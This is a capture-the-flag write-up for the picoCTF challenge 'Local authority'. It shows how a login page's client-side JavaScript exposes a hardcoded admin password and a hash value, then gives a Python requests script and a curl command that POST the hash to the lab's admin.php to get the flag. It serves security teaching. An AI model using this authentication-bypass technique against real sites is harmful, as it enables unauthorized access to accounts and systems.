# Local authority

1. [Description](#description)
2. [Script](#script)

#### Description

The web page we are presented contains a simple login form. It requires an username and a password. By inserting a simple mock-up credential, such as
```JSON
{
    "username": "test",
    "password": "test"
}
```
we are redirected to a `login.php` file which prompts the text: 
```
Log In Failed
```

Again, by accessing the **developer tools** of the Web Browser in use, it is possible to inspect the Web Page Source, i.e. the `HTML` file which is first loaded. In particular, the `login.php` files pop up and by clicking on it we are redirected to the file content source. Here, we can see that another file is loaded when the login button is clicked:
```HTML
<script src="secure.js"></script>
```

This file contains a function which checks the credential inserted on the form, in the following way:
```js
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}
```
Clearly, this is not the way you check for passwords... We can access the website with the credential disclosed and retrieve the flag.

#### Script
In order to log-in to web page, we need to take a step back. In `login.php` file we can see that the values passed as `username` and `password` are used as parameters of the credential checker we can find in the `secure.js` file: 
```js
loggedIn = checkPassword(window.username, window.password);
```
If the check results in success, the following piece of code is executed: 
```js
if(loggedIn) {
    document.getElementById('msg').innerHTML = "Log In Successful";
    document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
    document.getElementById('hiddenAdminForm').submit();
}
```
In particular, this piece of code does nothing more than filling itself another form and submit it. The form is the following (which can be find also in the `login.php` file): 
```HTML
<form hidden action="admin.php" method="post" id="hiddenAdminForm">
    <input type="text" name="hash" required id="adminFormHash">
</form>
```

Here we can retrieve three important information: 
- the name of the input parameter we need to pass from our script (i.e. `name="hash"`)
- the method of the input form we need to call from our script (i.e. `method="post"`) 
- the actual value which is passed by the javascript function previously analyzed (i.e. `2196812e91c29df34f5e217cfd639881`).

Now the script is straightforward.
1. In **python**, we first define the useful parameters.
```python
# ------- DATA -------
URL = "http://saturn.picoctf.net:52682/admin.php"
PAYLOAD = {
    "hash": "2196812e91c29df34f5e217cfd639881"
}
```
and then we create a `Session()` object which will use the `post` method along with the `URL` and the `PAYLOAD` data previously defined to retrieve the page source where the flag is found.
```python
# ------- LOG IN -------
with requests.Session() as s:
    result = s.post(URL, data=PAYLOAD)
    print(result.text)
```
Then it is just a matter of parsing the result: 
```python
# ------- PARSING RESULT ------- 
result = result.text.split("<body>")[1]
result = result.split("</body>")[0].strip()
print(result)
```

2. In a **shell** we can exploit the `curl` tool along with the `-X` tag, specifying the `POST` method and the `--data` tag, specifying the payload:
```sh
#!/bin/bash

curl -s -X POST --data hash=2196812e91c29df34f5e217cfd639881 "http://saturn.picoctf.net:52682/admin.php" | grep -oE "picoCTF{.*?}"

# -X 		select the method
# --data	receives in input the value to be passed along with the post request
```